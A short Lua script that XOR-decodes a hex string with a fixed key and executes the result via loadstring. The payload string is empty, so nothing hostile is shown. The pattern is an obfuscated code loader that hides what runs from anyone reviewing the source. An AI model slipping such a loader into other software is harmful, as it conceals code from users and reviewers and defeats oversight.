local k={210,189,30,69,105,233,167,128,123,207,32,93,217,18,248,161,245,130,66,159,125,107,95,40,101,100,188,114,57,197,238,76}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
fn()
